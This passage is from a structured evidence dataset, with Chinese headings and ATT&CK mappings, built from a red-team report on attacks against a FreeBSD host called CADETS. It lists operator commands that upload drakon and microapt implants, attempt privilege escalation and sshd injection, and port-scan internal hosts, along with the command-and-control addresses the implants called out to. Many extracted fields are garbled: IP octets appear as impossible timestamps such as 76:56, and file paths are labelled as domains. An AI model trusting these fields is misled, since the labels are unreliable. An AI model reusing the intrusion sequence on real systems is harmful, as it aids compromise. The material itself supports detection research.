  > process with root privileges connecting out to the operator console. The attacker then downloaded and
  > tried to elevate the micro apt implant a few more times, which still failed. As a backup, the attacker
  > simply executed the micro apt implant without root privileges. The micro apt implant connected out to
  > the micro apt listener for C2. The attacker used micro to portscan multiple targets on the network to
  > recon those targets vulnerable attach surface. The attacker left the operator console connection open.

- `3.13.1` Comments (lines 1007-1016)

  > The previous 2 attacks were meant to persist with an open connection but failed to do so because of
  > process injection failure. As a result, process injection was not attempted again at this time. Instead,
  > we tried to use process elevation with root privileges of the micro apt implant. For reasons unknown at
  > this point, we could not elevate (privilege escalate) the micro apt implant on the CADETS host despite
  > being able to elevate the drakon implant. After several tries, we finally gave up and just ran the micro
  > apt as the normal user in order to perform network recon using port scans. This is unfortunate as these
  > actions were easy to detect by the TC performers.

- `3.13.2` Event Log (lines 1017-1026)

  > - 1400 http_post shell F1
  > - 1402 putfile tmux-1002
  > - 1408 rm tmux-1002
  > - execfile /tmp/test
  > - 1437 scans micro
  > - 1438 quit

- `3.13.3` Addresses (lines 1027-1036)

  > - * [eth0:920] 25.159.96.207:80 -> 128.55.12.167:8040   webserver
  > - * [eth0:921] 76.56.184.25:80 -> 128.55.12.167:8041   shellcode_server
  > - * [eth0:922] 155.162.39.48:80 -> 128.55.12.167:8042   loaderDrakon
  > - * [eth0:923] 198.115.236.119:80 -> 128.55.12.167:8043 libdrakon (failed)
  > - * [eth0:924] 53.158.101.118:80 -> 128.55.12.167:8044 drakon
  > - * [eth0:952] 98.15.44.232:80 -> 128.55.12.167:8062   micro (failed)
  > - * [eth0:953] 192.113.144.28:80 -> 128.55.12.167:8063 micro 2 (sendmail)

- `3.13.4.1` Files (lines 1039-1059)

  > - F1>rm grain
  > - F1>rm vUGefai (failed)
  > - F1>putfile ./deploy/archive/microapt.freebsd.x64_98.15.44.232 tmux-1002
  > - F1>rm tmux-1002
  > - F1>putfile ./deploy/archive/microapt.freebsd.x64_98.15.44.232 minions
  > - F1>putfile ./deploy/archive/libdrakon.freebsd.x64.so_198.115.236.119 font
  > - F1>elevate /tmp/font
  > - F1>rm font
  > - F1>putfile ./deploy/archive/drakon.freebsd.x64_53.158.101.118 XIM
  > - rm vUGefai (failed)
  > - F2>rm minion
  > - F2>rm XIM
  > - F2>putfile ./deploy/archive/microapt.freebsd.x64_98.15.44.232 netlog
  > - F2>rm netlog
  > - F2>putfile ./deploy/archive/microapt.freebsd.x64_192.113.144.28 sendmail
  > - F2>rm sendmail
  > - F2>putfile ./deploy/archive/microapt.freebsd.x64_192.113.144.28 main
  > - F2>rm main
  > - F2>putfile ./deploy/archive/microapt.freebsd.x64_192.113.144.28 test
  > - F2>rm test

- `3.13.4.2` Processes (lines 1060-1078)

  > - F1>elevate /tmp/tmux-1002 (failed)
  > - F1>elevate /tmp/tmux-1002 (failed)
  > - F1>elevate /tmp/tmux-1002 (failed)
  > - F1>elevate /tmp/minions (failed)
  > - F1>elevate /tmp/minions (failed)
  > - F1>elevate /tmp/font (failed)
  > - F1>elevate /tmp/XIM (failed)
  > - F1>elevate /tmp/XIM
  > - F2>elevate /var/log/netlog (failed)
  > - F2>elevate /var/log/sendmail (failed)
  > - F2>elevate /var/log/sendmail (failed)
  > - F2>elevate /tmp/main (failed)
  > - F2>elevate main (failed)
  > - F2>elevate /tmp/test (failed)
  > - F2>elevate /tmp/test (failed)
  > - F2>elevate /tmp/test (failed)
  > - F2>execfile /tmp/test

- `3.13.4.3` Connections (lines 1079-1084)

  > - exploit: connection on port 80 from 25.159.96.207
  > - nginx: connection to 76.56.184.25:80
  > - nginx: connection to 155.162.39.48:80
  > - XIM: connection to 53.158.101.118:80

- `3.13.5.1` Connections (lines 1087-1097)

  > - sendmail: connection to 192.113.144.28:80
  > - APT>scan 128.55.12.166 22 6000
  > - APT>scan 128.55.12.67 22 6000
  > - APT>scan 128.55.12.141 22 6000
  > - APT>scan 128.55.12.110 22 6000
  > - APT>scan 128.55.12.118 22 6000
  > - APT>scan 128.55.12.10 22 6000
  > - APT>scan 128.55.12.1 22 6000
  > - APT>scan 128.55.12.55 22 6000

- `3.13.6` Graph (lines 1098-1101)
#### 证据条目

1. `3_13_e001` | `narrative_comment` | `3.13.lead Section Lead` | lines `996-1005`
   - Raw: The attacker continued the attack against CADETS by once again exploiting Nginx with a malformed HTTP request. This exploit once again resulted in a drakon implant running in memory of Nginx with a shell connected via HTTP to the operator console. The attacker downloaded the micro apt implant and tried to elevate it. This was unsuccessful multiple times, so the attacker downloaded drakon implant executable to the target disk and executed it with elevate privileges, resulting in a new drakon implant process with root privileges connecting out to the operator console. The attacker then downloaded and tried to elevate the micro apt implant a few more times, which still failed. As a backup, the attacker simply executed the micro apt implant without root privileges. The micro apt implant connected out to the micro apt listener for C2. The attacker used micro to portscan multiple targets on the network to recon those targets vulnerable attach surface. The attacker left the operator console connection open.
   - Time: `-` / `-`
   - Observables: process_name=nginx; process_name=drakon; process_name=micro; command=The attacker continued the attack against CADETS by once again exploiting Nginx with a malformed HTTP request. This exploit once again resulted in a drakon implant running in memory of Nginx with a shell connected via HTTP to the operator console. The attacker downloaded the micro apt implant and tried to elevate it. This was unsuccessful multiple times, so the attacker downloaded drakon implant executable to the target disk and executed it with elevate privileges, resulting in a new drakon implant process with root privileges connecting out to the operator console. The attacker then downloaded and tried to elevate the micro apt implant a few more times, which still failed. As a backup, the attacker simply executed the micro apt implant without root privileges. The micro apt implant connected out to the micro apt listener for C2. The attacker used micro to portscan multiple targets on the network to recon those targets vulnerable attach surface. The attacker left the operator console connection open.; host=CADETS; email_artifact=micro apt
1. `3_13_e002` | `narrative_comment` | `3.13.1 Comments` | lines `1009-1015`
   - Raw: The previous 2 attacks were meant to persist with an open connection but failed to do so because of process injection failure. As a result, process injection was not attempted again at this time. Instead, we tried to use process elevation with root privileges of the micro apt implant. For reasons unknown at this point, we could not elevate (privilege escalate) the micro apt implant on the CADETS host despite being able to elevate the drakon implant. After several tries, we finally gave up and just ran the micro apt as the normal user in order to perform network recon using port scans. This is unfortunate as these actions were easy to detect by the TC performers.
   - Time: `-` / `-`
   - Observables: process_name=drakon; process_name=micro; command=The previous 2 attacks were meant to persist with an open connection but failed to do so because of process injection failure. As a result, process injection was not attempted again at this time. Instead, we tried to use process elevation with root privileges of the micro apt implant. For reasons unknown at this point, we could not elevate (privilege escalate) the micro apt implant on the CADETS host despite being able to elevate the drakon implant. After several tries, we finally gave up and just ran the micro apt as the normal user in order to perform network recon using port scans. This is unfortunate as these actions were easy to detect by the TC performers.; host=CADETS; email_artifact=micro apt
1. `3_13_e003` | `event_log` | `3.13.2 Event Log` | lines `1019-1019`
   - Raw: 1400 http_post shell F1
   - Time: `1400` / `2018-04-12T14:00:00`
   - Observables: -
1. `3_13_e004` | `event_log` | `3.13.2 Event Log` | lines `1020-1020`
   - Raw: 1402 putfile tmux-1002
   - Time: `1402` / `2018-04-12T14:02:00`
   - Observables: command=1402 putfile tmux-1002
1. `3_13_e005` | `event_log` | `3.13.2 Event Log` | lines `1021-1021`
   - Raw: 1408 rm tmux-1002
   - Time: `1408` / `2018-04-12T14:08:00`
   - Observables: -
1. `3_13_e006` | `event_log` | `3.13.2 Event Log` | lines `1022-1022`
   - Raw: execfile /tmp/test
   - Time: `-` / `-`
   - Observables: file_path=/tmp/test; command=execfile /tmp/test
1. `3_13_e007` | `event_log` | `3.13.2 Event Log` | lines `1024-1024`
   - Raw: 1437 scans micro
   - Time: `1437` / `2018-04-12T14:37:00`
   - Observables: process_name=micro
1. `3_13_e008` | `event_log` | `3.13.2 Event Log` | lines `1025-1025`
   - Raw: 1438 quit
   - Time: `1438` / `2018-04-12T14:38:00`
   - Observables: -
1. `3_13_e009` | `address` | `3.13.3 Addresses` | lines `1029-1029`
   - Raw: * [eth0:920] 25.159.96.207:80 -> 128.55.12.167:8040   webserver
   - Time: `55.12` / `2018-04-12T55:12:00`
   - Observables: ip_port=25.159.96.207:80; ip_port=128.55.12.167:8040
1. `3_13_e010` | `address` | `3.13.3 Addresses` | lines `1030-1030`
   - Raw: * [eth0:921] 76.56.184.25:80 -> 128.55.12.167:8041   shellcode_server
   - Time: `76.56` / `2018-04-12T76:56:00`
   - Observables: ip_port=76.56.184.25:80; ip_port=128.55.12.167:8041
1. `3_13_e011` | `address` | `3.13.3 Addresses` | lines `1031-1031`
   - Raw: * [eth0:922] 155.162.39.48:80 -> 128.55.12.167:8042   loaderDrakon
   - Time: `39.48` / `2018-04-12T39:48:00`
   - Observables: ip_port=155.162.39.48:80; ip_port=128.55.12.167:8042; process_name=drakon; process_name=loaderdrakon
1. `3_13_e012` | `address` | `3.13.3 Addresses` | lines `1032-1032`
   - Raw: * [eth0:923] 198.115.236.119:80 -> 128.55.12.167:8043 libdrakon (failed)
   - Time: `55.12` / `2018-04-12T55:12:00`
   - Observables: ip_port=198.115.236.119:80; ip_port=128.55.12.167:8043; process_name=drakon
1. `3_13_e013` | `address` | `3.13.3 Addresses` | lines `1033-1033`
   - Raw: * [eth0:924] 53.158.101.118:80 -> 128.55.12.167:8044 drakon
   - Time: `55.12` / `2018-04-12T55:12:00`
   - Observables: ip_port=53.158.101.118:80; ip_port=128.55.12.167:8044; process_name=drakon
1. `3_13_e014` | `address` | `3.13.3 Addresses` | lines `1034-1034`
   - Raw: * [eth0:952] 98.15.44.232:80 -> 128.55.12.167:8062   micro (failed)
   - Time: `98.15` / `2018-04-12T98:15:00`
   - Observables: ip_port=98.15.44.232:80; ip_port=128.55.12.167:8062; process_name=micro
1. `3_13_e015` | `address` | `3.13.3 Addresses` | lines `1035-1035`
   - Raw: * [eth0:953] 192.113.144.28:80 -> 128.55.12.167:8063 micro 2 (sendmail)
   - Time: `28:80` / `2018-04-12T28:80:00`
   - Observables: ip_port=192.113.144.28:80; ip_port=128.55.12.167:8063; process_name=sendmail; process_name=micro
1. `3_13_e016` | `interaction_file` | `3.13.4.1 Files` | lines `1040-1040`
   - Raw: F1>rm grain
   - Time: `-` / `-`
   - Observables: -
1. `3_13_e017` | `interaction_file` | `3.13.4.1 Files` | lines `1041-1041`
   - Raw: F1>rm vUGefai (failed)
   - Time: `-` / `-`
   - Observables: -
1. `3_13_e018` | `interaction_file` | `3.13.4.1 Files` | lines `1042-1042`
   - Raw: F1>putfile ./deploy/archive/microapt.freebsd.x64_98.15.44.232 tmux-1002
   - Time: `15.44` / `2018-04-12T15:44:00`
   - Observables: file_path=/deploy/archive/microapt.freebsd.x64_98.15.44.232; domain=microapt.freebsd; process_name=micro; command=F1>putfile ./deploy/archive/microapt.freebsd.x64_98.15.44.232 tmux-1002; email_artifact=microapt
1. `3_13_e019` | `interaction_file` | `3.13.4.1 Files` | lines `1043-1043`
   - Raw: F1>rm tmux-1002
   - Time: `-` / `-`
   - Observables: -
1. `3_13_e020` | `interaction_file` | `3.13.4.1 Files` | lines `1044-1044`
   - Raw: F1>putfile ./deploy/archive/microapt.freebsd.x64_98.15.44.232 minions
   - Time: `15.44` / `2018-04-12T15:44:00`
   - Observables: file_path=/deploy/archive/microapt.freebsd.x64_98.15.44.232; domain=microapt.freebsd; process_name=micro; command=F1>putfile ./deploy/archive/microapt.freebsd.x64_98.15.44.232 minions; email_artifact=microapt
1. `3_13_e021` | `interaction_file` | `3.13.4.1 Files` | lines `1045-1045`
   - Raw: F1>putfile ./deploy/archive/libdrakon.freebsd.x64.so_198.115.236.119 font
   - Time: `-` / `-`
   - Observables: file_path=/deploy/archive/libdrakon.freebsd.x64.so_198.115.236.119; domain=libdrakon.freebsd; process_name=drakon; command=F1>putfile ./deploy/archive/libdrakon.freebsd.x64.so_198.115.236.119 font
1. `3_13_e022` | `interaction_file` | `3.13.4.1 Files` | lines `1046-1046`
   - Raw: F1>elevate /tmp/font
   - Time: `-` / `-`
   - Observables: file_path=/tmp/font; command=F1>elevate /tmp/font
1. `3_13_e023` | `interaction_file` | `3.13.4.1 Files` | lines `1047-1047`
   - Raw: F1>rm font
   - Time: `-` / `-`
   - Observables: -
1. `3_13_e024` | `interaction_file` | `3.13.4.1 Files` | lines `1048-1048`
   - Raw: F1>putfile ./deploy/archive/drakon.freebsd.x64_53.158.101.118 XIM
   - Time: `-` / `-`
   - Observables: file_path=/deploy/archive/drakon.freebsd.x64_53.158.101.118; domain=drakon.freebsd; process_name=drakon; command=F1>putfile ./deploy/archive/drakon.freebsd.x64_53.158.101.118 XIM
1. `3_13_e025` | `interaction_file` | `3.13.4.1 Files` | lines `1049-1049`
   - Raw: rm vUGefai (failed)
   - Time: `-` / `-`
   - Observables: -
1. `3_13_e026` | `interaction_file` | `3.13.4.1 Files` | lines `1050-1050`
   - Raw: F2>rm minion
   - Time: `-` / `-`
   - Observables: -
1. `3_13_e027` | `interaction_file` | `3.13.4.1 Files` | lines `1051-1051`
   - Raw: F2>rm XIM
   - Time: `-` / `-`
   - Observables: -
1. `3_13_e028` | `interaction_file` | `3.13.4.1 Files` | lines `1052-1052`
   - Raw: F2>putfile ./deploy/archive/microapt.freebsd.x64_98.15.44.232 netlog
   - Time: `15.44` / `2018-04-12T15:44:00`
   - Observables: file_path=/deploy/archive/microapt.freebsd.x64_98.15.44.232; domain=microapt.freebsd; process_name=micro; command=F2>putfile ./deploy/archive/microapt.freebsd.x64_98.15.44.232 netlog; email_artifact=microapt
1. `3_13_e029` | `interaction_file` | `3.13.4.1 Files` | lines `1053-1053`
   - Raw: F2>rm netlog
   - Time: `-` / `-`
   - Observables: -
1. `3_13_e030` | `interaction_file` | `3.13.4.1 Files` | lines `1054-1054`
   - Raw: F2>putfile ./deploy/archive/microapt.freebsd.x64_192.113.144.28 sendmail
   - Time: `-` / `-`
   - Observables: file_path=/deploy/archive/microapt.freebsd.x64_192.113.144.28; domain=microapt.freebsd; process_name=sendmail; process_name=micro; command=F2>putfile ./deploy/archive/microapt.freebsd.x64_192.113.144.28 sendmail; email_artifact=microapt
1. `3_13_e031` | `interaction_file` | `3.13.4.1 Files` | lines `1055-1055`
   - Raw: F2>rm sendmail
   - Time: `-` / `-`
   - Observables: process_name=sendmail
1. `3_13_e032` | `interaction_file` | `3.13.4.1 Files` | lines `1056-1056`
   - Raw: F2>putfile ./deploy/archive/microapt.freebsd.x64_192.113.144.28 main
   - Time: `-` / `-`
   - Observables: file_path=/deploy/archive/microapt.freebsd.x64_192.113.144.28; domain=microapt.freebsd; process_name=micro; command=F2>putfile ./deploy/archive/microapt.freebsd.x64_192.113.144.28 main; email_artifact=microapt
1. `3_13_e033` | `interaction_file` | `3.13.4.1 Files` | lines `1057-1057`
   - Raw: F2>rm main
   - Time: `-` / `-`
   - Observables: -
1. `3_13_e034` | `interaction_file` | `3.13.4.1 Files` | lines `1058-1058`
   - Raw: F2>putfile ./deploy/archive/microapt.freebsd.x64_192.113.144.28 test
   - Time: `-` / `-`
   - Observables: file_path=/deploy/archive/microapt.freebsd.x64_192.113.144.28; domain=microapt.freebsd; process_name=micro; command=F2>putfile ./deploy/archive/microapt.freebsd.x64_192.113.144.28 test; email_artifact=microapt
1. `3_13_e035` | `interaction_file` | `3.13.4.1 Files` | lines `1059-1059`
   - Raw: F2>rm test
   - Time: `-` / `-`
   - Observables: -
1. `3_13_e036` | `interaction_process` | `3.13.4.2 Processes` | lines `1061-1061`
   - Raw: F1>elevate /tmp/tmux-1002 (failed)
   - Time: `-` / `-`
   - Observables: file_path=/tmp/tmux-1002; command=F1>elevate /tmp/tmux-1002 (failed)
1. `3_13_e037` | `interaction_process` | `3.13.4.2 Processes` | lines `1062-1062`
   - Raw: F1>elevate /tmp/tmux-1002 (failed)
   - Time: `-` / `-`
   - Observables: file_path=/tmp/tmux-1002; command=F1>elevate /tmp/tmux-1002 (failed)
1. `3_13_e038` | `interaction_process` | `3.13.4.2 Processes` | lines `1063-1063`
   - Raw: F1>elevate /tmp/tmux-1002 (failed)
   - Time: `-` / `-`
   - Observables: file_path=/tmp/tmux-1002; command=F1>elevate /tmp/tmux-1002 (failed)
1. `3_13_e039` | `interaction_process` | `3.13.4.2 Processes` | lines `1064-1064`
   - Raw: F1>elevate /tmp/minions (failed)
   - Time: `-` / `-`
   - Observables: file_path=/tmp/minions; command=F1>elevate /tmp/minions (failed)
1. `3_13_e040` | `interaction_process` | `3.13.4.2 Processes` | lines `1065-1065`
   - Raw: F1>elevate /tmp/minions (failed)
   - Time: `-` / `-`
   - Observables: file_path=/tmp/minions; command=F1>elevate /tmp/minions (failed)
1. `3_13_e041` | `interaction_process` | `3.13.4.2 Processes` | lines `1066-1066`
   - Raw: F1>elevate /tmp/font (failed)
   - Time: `-` / `-`
   - Observables: file_path=/tmp/font; command=F1>elevate /tmp/font (failed)
1. `3_13_e042` | `interaction_process` | `3.13.4.2 Processes` | lines `1067-1067`
   - Raw: F1>elevate /tmp/XIM (failed)
   - Time: `-` / `-`
   - Observables: file_path=/tmp/XIM; command=F1>elevate /tmp/XIM (failed)
1. `3_13_e043` | `interaction_process` | `3.13.4.2 Processes` | lines `1069-1069`
   - Raw: F1>elevate /tmp/XIM
   - Time: `-` / `-`
   - Observables: file_path=/tmp/XIM; command=F1>elevate /tmp/XIM
1. `3_13_e044` | `interaction_process` | `3.13.4.2 Processes` | lines `1070-1070`
   - Raw: F2>elevate /var/log/netlog (failed)
   - Time: `-` / `-`
   - Observables: file_path=/var/log/netlog; command=F2>elevate /var/log/netlog (failed)
1. `3_13_e045` | `interaction_process` | `3.13.4.2 Processes` | lines `1071-1071`
   - Raw: F2>elevate /var/log/sendmail (failed)
   - Time: `-` / `-`
   - Observables: file_path=/var/log/sendmail; process_name=sendmail; command=F2>elevate /var/log/sendmail (failed)
1. `3_13_e046` | `interaction_process` | `3.13.4.2 Processes` | lines `1072-1072`
   - Raw: F2>elevate /var/log/sendmail (failed)
   - Time: `-` / `-`
   - Observables: file_path=/var/log/sendmail; process_name=sendmail; command=F2>elevate /var/log/sendmail (failed)
1. `3_13_e047` | `interaction_process` | `3.13.4.2 Processes` | lines `1073-1073`
   - Raw: F2>elevate /tmp/main (failed)
   - Time: `-` / `-`
   - Observables: file_path=/tmp/main; command=F2>elevate /tmp/main (failed)
1. `3_13_e048` | `interaction_process` | `3.13.4.2 Processes` | lines `1074-1074`
   - Raw: F2>elevate main (failed)
   - Time: `-` / `-`
   - Observables: command=F2>elevate main (failed)
1. `3_13_e049` | `interaction_process` | `3.13.4.2 Processes` | lines `1075-1075`
   - Raw: F2>elevate /tmp/test (failed)
   - Time: `-` / `-`
   - Observables: file_path=/tmp/test; command=F2>elevate /tmp/test (failed)
1. `3_13_e050` | `interaction_process` | `3.13.4.2 Processes` | lines `1076-1076`
   - Raw: F2>elevate /tmp/test (failed)
   - Time: `-` / `-`
   - Observables: file_path=/tmp/test; command=F2>elevate /tmp/test (failed)
1. `3_13_e051` | `interaction_process` | `3.13.4.2 Processes` | lines `1077-1077`
   - Raw: F2>elevate /tmp/test (failed)
   - Time: `-` / `-`
   - Observables: file_path=/tmp/test; command=F2>elevate /tmp/test (failed)
1. `3_13_e052` | `interaction_process` | `3.13.4.2 Processes` | lines `1078-1078`
   - Raw: F2>execfile /tmp/test
   - Time: `-` / `-`
   - Observables: file_path=/tmp/test; command=F2>execfile /tmp/test
1. `3_13_e053` | `interaction_connection` | `3.13.4.3 Connections` | lines `1080-1080`
   - Raw: exploit: connection on port 80 from 25.159.96.207
   - Time: `-` / `-`
   - Observables: -
1. `3_13_e054` | `interaction_connection` | `3.13.4.3 Connections` | lines `1081-1081`
   - Raw: nginx: connection to 76.56.184.25:80
   - Time: `76.56` / `2018-04-12T76:56:00`
   - Observables: ip_port=76.56.184.25:80; process_name=nginx
1. `3_13_e055` | `interaction_connection` | `3.13.4.3 Connections` | lines `1082-1082`
   - Raw: nginx: connection to 155.162.39.48:80
   - Time: `39.48` / `2018-04-12T39:48:00`
   - Observables: ip_port=155.162.39.48:80; process_name=nginx
1. `3_13_e056` | `interaction_connection` | `3.13.4.3 Connections` | lines `1083-1083`
   - Raw: XIM: connection to 53.158.101.118:80
   - Time: `-` / `-`
   - Observables: ip_port=53.158.101.118:80
1. `3_13_e057` | `interaction_connection` | `3.13.5.1 Connections` | lines `1088-1088`
   - Raw: sendmail: connection to 192.113.144.28:80
   - Time: `28:80` / `2018-04-12T28:80:00`
   - Observables: ip_port=192.113.144.28:80; process_name=sendmail
1. `3_13_e058` | `interaction_connection` | `3.13.5.1 Connections` | lines `1089-1089`
   - Raw: APT>scan 128.55.12.166 22 6000
   - Time: `55.12` / `2018-04-12T55:12:00`
   - Observables: -
1. `3_13_e059` | `interaction_connection` | `3.13.5.1 Connections` | lines `1090-1090`
   - Raw: APT>scan 128.55.12.67 22 6000
   - Time: `55.12` / `2018-04-12T55:12:00`
   - Observables: -
1. `3_13_e060` | `interaction_connection` | `3.13.5.1 Connections` | lines `1091-1091`
   - Raw: APT>scan 128.55.12.141 22 6000
   - Time: `55.12` / `2018-04-12T55:12:00`
   - Observables: -
1. `3_13_e061` | `interaction_connection` | `3.13.5.1 Connections` | lines `1092-1092`
   - Raw: APT>scan 128.55.12.110 22 6000
   - Time: `55.12` / `2018-04-12T55:12:00`
   - Observables: -
1. `3_13_e062` | `interaction_connection` | `3.13.5.1 Connections` | lines `1093-1093`
   - Raw: APT>scan 128.55.12.118 22 6000
   - Time: `55.12` / `2018-04-12T55:12:00`
   - Observables: -
1. `3_13_e063` | `interaction_connection` | `3.13.5.1 Connections` | lines `1094-1094`
   - Raw: APT>scan 128.55.12.10 22 6000
   - Time: `55.12` / `2018-04-12T55:12:00`
   - Observables: -
1. `3_13_e064` | `interaction_connection` | `3.13.5.1 Connections` | lines `1095-1095`
   - Raw: APT>scan 128.55.12.1 22 6000
   - Time: `55.12` / `2018-04-12T55:12:00`
   - Observables: -
1. `3_13_e065` | `interaction_connection` | `3.13.5.1 Connections` | lines `1096-1096`
   - Raw: APT>scan 128.55.12.55 22 6000
   - Time: `55.12` / `2018-04-12T55:12:00`
   - Observables: -

### CADETS_20180413_0904_0915_04 / Section 3.14

- 标题：`20180413 CADETS – Nginx Backdoor w/ Drakon In-Memory`
- 状态：`confirmed`
- 时间精度：`minute_window`
- 时间窗：`2018-04-13T09:04:00` -> `2018-04-13T09:15:00`
- Markdown 行号：`1102-1175`
- 报告页：`26, 27`
- 攻击概述：CADETS 上重新连回旧 shell 后，再次通过 Nginx exploit 生成新的 drakon in-memory 会话，把 drakon 与 libdrakon 落盘、提权为 root 进程、再次回连，并对 sshd 做多次注入尝试。
- 备注：窗口中 inject 仍失败，但 whoami/ps、落盘、提权和第二条 C2 都是明确成功行为。

#### 战术判定

| Tactic | Judgment | 含义 | Why | Evidence IDs |
| --- | --- | --- | --- | --- |
| INITIAL_ACCESS | confirmed | 初始进入 | 重新 exploit Nginx 形成新的进入链。 | 3_14_e001, 3_14_e006, 3_14_e007 |
| EXECUTION | confirmed | 执行 | drakon/libdrakon 从磁盘运行与复制，形成盘上执行链。 | 3_14_e008, 3_14_e009, 3_14_e026, 3_14_e027, 3_14_e028, 3_14_e029, 3_14_e030, 3_14_e001, 3_14_e010, 3_14_e031 |
| PRIVILEGE_ESCALATION | confirmed | 提权 | 新的 drakon 进程以 root 权限运行。 | 3_14_e001, 3_14_e010, 3_14_e031 |
| COMMAND_AND_CONTROL | confirmed | 命令控制 | 旧 shell reconnect 与新的 root drakon/operator console 连接都已形成。 | 3_14_e003, 3_14_e001, 3_14_e011, 3_14_e012, 3_14_e038 |
| DISCOVERY | confirmed | 侦察发现 | whoami 和 ps/sshd PID 枚举共同支撑身份与进程侦察。 | 3_14_e004, 3_14_e013, 3_14_e014, 3_14_e015, 3_14_e016 |

#### Technique 判定

| Technique | Judgment | Why | Evidence IDs |
| --- | --- | --- | --- |
| T1190 | confirmed | Nginx 再次被 exploit。 | 3_14_e001, 3_14_e006, 3_14_e007 |
| T1071.001 | confirmed | 旧 shell 与新的 drakon/operator console 使用 web 风格外联。 | 3_14_e003, 3_14_e001, 3_14_e011, 3_14_e012, 3_14_e038 |
| T1105 | confirmed | drakon 与 libdrakon 被传入并落盘复制。 | 3_14_e008, 3_14_e009, 3_14_e026, 3_14_e027, 3_14_e028, 3_14_e029, 3_14_e030 |
| T1033 | confirmed | whoami 明确对应身份发现。 | 3_14_e004, 3_14_e013 |
| T1057 | confirmed | ps 与 sshd PID 对应进程发现。 | 3_14_e014, 3_14_e015, 3_14_e016 |

#### Behavior Chain

| Behavior ID | Action | Judgment | Why | Evidence IDs |
| --- | --- | --- | --- | --- |
| reconnect_old_shell | c2_callback | confirmed | Event Log 开头明确写到 reconnect to open connection。 | 3_14_e003 |
| identity_discovery | identity_discovery | confirmed | Event Log 中直接执行 whoami。 | 3_14_e004, 3_14_e013 |
| process_discovery | process_discovery | confirmed | Event Log 中多次 ps，并明确给出 sshd PID 20691。 | 3_14_e014, 3_14_e015, 3_14_e016 |
| exploit_delivery | exploit_delivery | confirmed | 报告正文和 Event Log 都写明重新用 HTTP 请求 exploit Nginx 成功。 | 3_14_e001, 3_14_e006, 3_14_e007 |
| payload_write | payload_write | confirmed | drakon 与 libdrakon 被 putfile 到 pEja72mA / eWq10bVcx，再复制成 memhelp.so/eraseme/done.so。 | 3_14_e008, 3_14_e009, 3_14_e026, 3_14_e027, 3_14_e028, 3_14_e029, 3_14_e030 |
| payload_elevate | payload_elevate | confirmed | 正文写明 drakon executable was ran from disk as root，Event Log 中也有 elevate pEja72mA。 | 3_14_e001, 3_14_e010, 3_14_e031 |
| c2_callback | c2_callback | confirmed | 新的 root drakon 进程再次连接 operator console，连接交互中也有 pEja72mA 外联。 | 3_14_e001, 3_14_e011, 3_14_e012, 3_14_e038 |
| inject_attempt | inject_attempt | attempted | F2 使用 memhelp.so/eraseme/done.so 对 sshd 20691 做多次 inject，但仍失败。 | 3_14_e017, 3_14_e032, 3_14_e033, 3_14_e034 |

#### 显式观测

- `process_name` / `nginx`  Evidence: `3_14_e001, 3_14_e036, 3_14_e037`  Raw: nginx
- `process_name` / `sshd`  Evidence: `3_14_e001, 3_14_e002, 3_14_e015, 3_14_e039`  Raw: sshd
- `process_name` / `drakon`  Evidence: `3_14_e001, 3_14_e002, 3_14_e008, 3_14_e009, 3_14_e023, 3_14_e024, 3_14_e025, 3_14_e026, 3_14_e027`  Raw: drakon
- `command` / `Finished attack against CADETS FreeBSD by trying to inject into sshd one last time, which failed. Connected to a left open connection from the previous attack then disconnected it. Re-exploited Nginx with an HTTP request, once again resulting in a new drakon implant running in Nginx memory. The drakon implant connected out to the operator console for C2. The attacker downloaded the drakon implant executable and library to disk. The drakon implant executable was ran from disk, resulting in a new drakon process with root privileges and a new connection to the operator console. The attacker then used the root drakon implant to try to inject into sshd once again but failed.`  Evidence: `3_14_e001`  Raw: inject
- `host` / `CADETS`  Evidence: `3_14_e001, 3_14_e002`  Raw: CADETS
- `command` / `We tried one last time to get injection to work on CADETS. Our working theory was that there was some conflict with our elevate code and CADETS, so we built a version of the process injection module which would not perform a privilege escalation. This would need to be done before trying to inject the drakon implant into the target process. The new module did not work, and injection failed multiple times without the CADETS host crashing. Eventually, the sshd process became unresponsive and needed to be restarted.`  Evidence: `3_14_e002`  Raw: elevate
- `command` / `09:04 whoami`  Evidence: `3_14_e004`  Raw: whoami
- `file_path` / `/deploy/archive/drakon.freebsd.x64_53.158.101.118`  Evidence: `3_14_e008, 3_14_e026`  Raw: /deploy/archive/drakon.freebsd.x64_53.158.101.118
- `domain` / `drakon.freebsd`  Evidence: `3_14_e008, 3_14_e025, 3_14_e026`  Raw: drakon.freebsd
- `command` / `09:10 putfile ./deploy/archive/drakon.freebsd.x64_53.158.101.118 pEja72mA`  Evidence: `3_14_e008`  Raw: putfile
- `file_path` / `/deploy/archive/libdrakon.freebsd.x64.so_198.115.236.119`  Evidence: `3_14_e009, 3_14_e027`  Raw: /deploy/archive/libdrakon.freebsd.x64.so_198.115.236.119
- `domain` / `libdrakon.freebsd`  Evidence: `3_14_e009, 3_14_e024, 3_14_e027`  Raw: libdrakon.freebsd
- `command` / `09:11 putfile ./deploy/archive/libdrakon.freebsd.x64.so_198.115.236.119 eWq10bVcx`  Evidence: `3_14_e009`  Raw: putfile
- `command` / `09:12 elevate pEja72mA`  Evidence: `3_14_e010`  Raw: elevate
- `command` / `09:12 whoami`  Evidence: `3_14_e013`  Raw: whoami
- `command` / `09:13 ps`  Evidence: `3_14_e014`  Raw: ps
- `file_path` / `/usr/sbin/sshd`  Evidence: `3_14_e015`  Raw: /usr/sbin/sshd
- `pid` / `20691`  Evidence: `3_14_e015`  Raw: 20691
- `command` / `09:14 ps`  Evidence: `3_14_e016`  Raw: ps
- `command` / `09:15 inject`  Evidence: `3_14_e017`  Raw: inject
- `command` / `inject`  Evidence: `3_14_e018, 3_14_e019`  Raw: inject
- `ip_port` / `25.159.96.207:80`  Evidence: `3_14_e021`  Raw: 25.159.96.207:80
- `ip_port` / `128.55.12.167:8040`  Evidence: `3_14_e021`  Raw: 128.55.12.167:8040
- `ip_port` / `76.56.184.25:80`  Evidence: `3_14_e022`  Raw: 76.56.184.25:80
- `ip_port` / `128.55.12.167:8041`  Evidence: `3_14_e022`  Raw: 128.55.12.167:8041
- `ip_port` / `155.162.39.48:80`  Evidence: `3_14_e023, 3_14_e037`  Raw: 155.162.39.48:80
- `ip_port` / `128.55.12.167:8042`  Evidence: `3_14_e023`  Raw: 128.55.12.167:8042
- `domain` / `loaderDrakon.freebsd`  Evidence: `3_14_e023`  Raw: loaderDrakon.freebsd
- `process_name` / `loaderdrakon`  Evidence: `3_14_e023`  Raw: loaderdrakon
- `ip_port` / `198.115.236.119:80`  Evidence: `3_14_e024, 3_14_e039`  Raw: 198.115.236.119:80
